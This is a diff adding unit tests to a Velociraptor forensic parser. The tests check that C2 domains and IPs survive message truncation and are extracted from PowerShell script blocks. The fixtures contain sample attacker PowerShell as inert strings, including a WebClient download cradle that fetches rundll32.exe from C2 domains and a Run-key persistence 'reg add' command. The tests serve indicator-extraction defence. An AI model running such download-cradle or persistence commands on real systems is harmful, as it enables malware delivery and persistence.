@@ -1341,6 +1341,83 @@ describe("parseVelociraptorJson — timestamp coverage for raw artifacts", () =>
     expect(ev.description.length).toBeLessThanOrEqual(600); // description stays the short summary
   });
 
+  // ── The message cap. A PowerShell script long enough to be cut kept its C2 table in the
+  // half that was cut, so the stored event named no attacker infrastructure at all — on a real case
+  // (INC-2026-001) 181 events each held exactly 4,001 characters of module boilerplate and not one
+  // C2 host. The cap itself stays: the forensic timeline feeds AI synthesis and the cap is what
+  // bounds it. What must not stay is the SILENCE about what the cap removed.
+  //
+  // A message whose indicators sit on both sides of the cut, so the assertions can tell "kept" apart
+  // from "disclosed". The filler is deliberately indicator-free.
+  const PRE_CUT_DOMAIN = "staging-pre.example.com";
+  const PRE_CUT_IP = "198.51.100.9";
+  const POST_CUT_DOMAIN = "workspacin-post.example.net";
+  const POST_CUT_IP = "203.0.113.77";
+  function splitIndicatorScript(): string {
+    const head = `ScriptBlock: Invoke-WebRequest ${PRE_CUT_DOMAIN} ; $peer = "${PRE_CUT_IP}"\n`;
+    const filler = "Write-Host 'benign module boilerplate line' ; ".repeat(200);
+    const tail = `\n$C2 = @("${POST_CUT_DOMAIN}") ; $ExfilIp = "${POST_CUT_IP}"`;
+    return head + filler + tail;
+  }
+
+  it("keeps the post-cut indicators discoverable from the stored event", () => {
+    const raw = splitIndicatorScript();
+    expect(raw.length).toBeGreaterThan(4000); // the fixture must actually reach the cap
+    expect(raw.indexOf(POST_CUT_DOMAIN)).toBeGreaterThan(4000); // …and hide its C2 table past it
+    const text = JSON.stringify({
+      "Custom.PSScript": [{ Message: raw, SomeTime: "2026-06-01T00:00:00Z" }],
+    });
+    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
+    const message = r.events[0].message as string;
+
+    // What the analyst reads before the cut is unchanged.
+    expect(message).toContain(PRE_CUT_DOMAIN);
+    expect(message).toContain(PRE_CUT_IP);
+    // The body is still capped — this is a disclosure, not a raised ceiling.
+    expect(message.slice(0, 4001)).toBe(`${raw.slice(0, 4000)}\u2026`);
+    // The note is a short disclosure, not the rest of the script smuggled back in.
+    expect(message.length).toBeLessThan(4001 + 800);
+    // And the indicators the cut removed are named, with the size of the cut.
+    expect(message).toContain(POST_CUT_DOMAIN);
+    expect(message).toContain(POST_CUT_IP);
+    expect(message).toContain(`${raw.length - 4000} more characters`);
+  });
+
+  it("recovers a C2 domain the cut split in half", () => {
+    // The cap counts characters, not tokens, so it lands mid-domain as readily as between two.
+    // Scanning only what was dropped reports a suffix that never existed ("er.example.net"), which
+    // an analyst can pivot on and find nothing. Position the fixture so the cut falls inside the
+    // domain itself.
+    const STRADDLER = "c2-straddler.example.net";
+    const head = "ScriptBlock: Write-Host 'x' ; ";
+    const filler = "Write-Host 'benign module boilerplate line' ; ".repeat(200);
+    const cutAt = 4000 - 12; // 12 characters of the domain stay above the cap, the rest is dropped
+    const raw = `${head}${filler}`.slice(0, cutAt) + STRADDLER + " was the beacon target";
+    expect(raw.indexOf(STRADDLER)).toBeLessThan(4000);
+    expect(raw.indexOf(STRADDLER) + STRADDLER.length).toBeGreaterThan(4000); // genuinely split
+
+    const text = JSON.stringify({
+      "Custom.PSScript": [{ Message: raw, SomeTime: "2026-06-01T00:00:00Z" }],
+    });
+    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
+    const message = r.events[0].message as string;
+    // The note names the WHOLE domain, not the half that fell past the cap.
+    expect(message.slice(4001)).toContain(STRADDLER);
+    expect(message.slice(4001)).not.toContain("er.example.net was");
+  });
+
+  it("leaves a message that fits the cap exactly as it was", () => {
+    // No cut ⇒ nothing to disclose. A note on an untruncated message would be noise on every row.
+    const raw = `ScriptBlock: ${"Write-Host 'x' ; ".repeat(50)}${POST_CUT_DOMAIN}`;
+    expect(raw.length).toBeLessThan(4000);
+    const text = JSON.stringify({
+      "Custom.PSScript": [{ Message: raw, SomeTime: "2026-06-01T00:00:00Z" }],
+    });
+    const r = parseVelociraptorJson(text, { artifact: "Custom.PSScript", aggregate: false });
+    expect(r.events[0].message).toBe(raw);
+    expect(r.events[0].message).not.toContain("more characters");
+  });
+
   it("does NOT set message when the description already contains the whole thing (#9)", () => {
     // A short message wholly inside the (uncapped) description adds nothing to reveal → message stays unset.
     const text = JSON.stringify({
@@ -1928,6 +2005,73 @@ describe("parseVelociraptorJson — PowerShell 4104 script-block fragments", () 
   });
 });
 
+// ── A collected PowerShell script block names its C2 by DOMAIN as often as by IP. scrapeText
+// extracted the URLs, IPs and hashes out of that free text but had no domain pattern, so on a real
+// case (a Lunar Spider simulation) 566 IOCs came out with ZERO of type `domain`: seventeen C2
+// domains sat in the script text while the ten C2 IPs beside them were extracted, and the AI summary
+// concluded "no command-and-control infrastructure is confirmed". The fixture below is that shape —
+// C2 domains and C2 IPs in one block, mixed with the dotted tokens Velociraptor text is full of
+// (file names, a .NET framework path, a registry key, version strings) that must NOT become domains.
+describe("parseVelociraptorJson — domains embedded in free text (script blocks, command lines)", () => {
+  const SCRIPT = [
+    "$c = New-Object System.Net.WebClient",
+    "$hosts = @('winsoftwarehub.top','cdn.brutratel-c2.net','update.latrodectus-panel.com')",
+    "$ips = @('185.220.101.44','45.153.240.19')",
+    'foreach ($h in $hosts) { $c.DownloadFile("http://$h/api/update", "C:\\Users\\Public\\rundll32.exe") }',
+    "Start-Process C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -ArgumentList 'loader.dll'",
+    "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\svchost.ps1",
+    "# built against 10.0.22621.2506, drops beacon.dat",
+  ].join("\n");
+
+  const scriptBlockRow = (): object => ({
+    _index: "artifact_detectraptor_windows_detection_evtx",
+    "@timestamp": "2026-05-07T16:31:04.000Z",
+    "Detection.Name": "PowerShell - Suspicious Download Cradle",
+    Computer: "WS-01",
+    "System.EventID.Value": 4104,
+    "System.Channel": "Microsoft-Windows-PowerShell/Operational",
+    "EventData.ScriptBlockId": "1f6a0d2c-4b77-4d1e-9a54-6b0f2f7a1c33",
+    "EventData.MessageNumber": 1,
+    "EventData.MessageTotal": 1,
+    "EventData.ScriptBlockText": SCRIPT,
+    Message: `Creating Scriptblock text (1 of 1):\n${SCRIPT}`,
+    "Artifact.keyword": "DetectRaptor.Windows.Detection.Evtx",
+  });
+
+  const domainsOf = (): string[] =>
+    parseVelociraptorJson(JSON.stringify([scriptBlockRow()]))
+      .iocs.filter((i) => i.type === "domain")
+      .map((i) => i.value);
+
+  it("extracts the C2 domains named in the script block", () => {
+    expect(domainsOf().sort()).toEqual([
+      "cdn.brutratel-c2.net",
+      "update.latrodectus-panel.com",
+      "winsoftwarehub.top",
+    ]);
+  });
+
+  it("still extracts the C2 IPs from the same block (no regression)", () => {
+    const ips = parseVelociraptorJson(JSON.stringify([scriptBlockRow()]))
+      .iocs.filter((i) => i.type === "ip")
+      .map((i) => i.value);
+    expect(ips).toEqual(expect.arrayContaining(["185.220.101.44", "45.153.240.19"]));
+  });
+
+  it("does not turn a file name into a domain", () => {
+    const d = domainsOf();
+    for (const f of ["rundll32.exe", "csc.exe", "loader.dll", "svchost.ps1", "beacon.dat"]) {
+      expect(d).not.toContain(f);
+    }
+  });
+
+  it("does not turn a Windows path component or a version string into a domain", () => {
+    const d = domainsOf();
+    expect(d).not.toContain("microsoft.net"); // C:\Windows\Microsoft.NET\… is a directory, not a domain
+    expect(d.some((v) => /^\d/.test(v))).toBe(false); // 10.0.22621.2506, v4.0.30319
+  });
+});
+
 // #640 — msgFingerprint used to strip EVERY digit, so two Sysmon network-connection Sigma rows that
 // differed only in destination address produced an identical fingerprint, an identical aggKey, and
 // therefore ONE merged event holding the first row's description. Every IP scraped from every merged
@@ -2054,6 +2198,73 @@ describe("parseVelociraptorJson — network identifiers keep events distinct (#6
     expect(parsed.events).toHaveLength(1);
     expect(parsed.events[0].count).toBe(3);
   });
+
+  // #649 — #646 bounded the candidate on [^0-9a-z:], which only knows ASCII letters and does not
+  // know the underscore. Both are ordinary identifier characters, so both read as delimiters and
+  // the digits beside them became an "address" — the same defect as #646, reached through a
+  // character class that stops at ASCII. It bites hardest on non-English hosts, where usernames,
+  // paths and script content are routinely non-ASCII.
+  it.each([
+    ["Latin with an accent", "handler café::% done"],
+    ["Hebrew", "handler משתמש::% done"],
+    ["Cyrillic", "handler пользователь::% done"],
+    ["CJK", "handler 用户::% done"],
+    ["Greek", "handler χρήστης::% done"],
+  ])("STILL merges repeats that differ only in a volatile id — %s", (_label, template) => {
+    const row = (id: string): object => ({
+      _Source: "Custom.App",
+      Message: template.replace("%", id),
+      Timestamp: "2026-01-01T00:00:00Z",
+    });
+    const parsed = parseVelociraptorJson(JSON.stringify([row("1234"), row("5678"), row("9012")]));
+    expect(parsed.events).toHaveLength(1);
+    expect(parsed.events[0].count).toBe(3);
+  });
+
+  // The connector-punctuation trade, at the level where the analyst sees it. A bound strict enough
+  // to reject "worker_::1234" also rejects "conn_::1", and nothing separates them, so connectors
+  // separate and this text yields an address token that is not one. The cost is these three
+  // records not merging; the alternative cost is two different destinations merging, which is the
+  // defect this whole area exists to prevent. Asserted, not left implicit, so the split reads as a
+  // known price rather than a regression. See networkTokens.ts for the full argument.
+  it("splits on an id beside a connector — the accepted cost of never suppressing an address", () => {
+    const row = (id: string): object => ({
+      _Source: "Custom.App",
+      Message: `handler worker_::${id} done`,
+      Timestamp: "2026-01-01T00:00:00Z",
+    });
+    const parsed = parseVelociraptorJson(JSON.stringify([row("1234"), row("5678"), row("9012")]));
+    expect(parsed.events).toHaveLength(3);
+  });
+
+  // A real address beside the same connector must survive — the half the trade is protecting.
+  it.each([
+    ["hex-leading", "fe80::1", "fe80::99"],
+    ["colon-leading", "::1", "::99"],
+  ])("keeps two destinations apart beside a connector — %s", (_label, a, b) => {
+    const row = (tgt: string): object => ({
+      _Source: "Custom.App",
+      Message: `conn_${tgt}_closed`,
+      Timestamp: "2026-01-01T00:00:00Z",
+    });
+    const parsed = parseVelociraptorJson(JSON.stringify([row(a), row(b)]));
+    expect(parsed.events).toHaveLength(2);
+  });
+
+  // The other half of the same rule: tightening the bound until identifier text stops matching must
+  // not also drop a real address that merely sits against ordinary punctuation.
+  it.each(["peer=%;", "(%)", "<%>", '"%"', "ip: %, port 443", "addr|%|"])(
+    "still separates two destinations written as %s",
+    (wrapper) => {
+      const row = (tgt: string): object => ({
+        _Source: "Custom.App",
+        Message: `conn ${wrapper.replace("%", tgt)} established`,
+        Timestamp: "2026-01-01T00:00:00Z",
+      });
+      const parsed = parseVelociraptorJson(JSON.stringify([row("fe80::1"), row("fe80::99")]));
+      expect(parsed.events).toHaveLength(2);
+    },
+  );
 
   // The rule is "is it a WORD or a standalone address", not "does it look like an id". A bare
   // "1234::1234" is a well-formed IPv6 literal with nothing attached, so it is treated as an
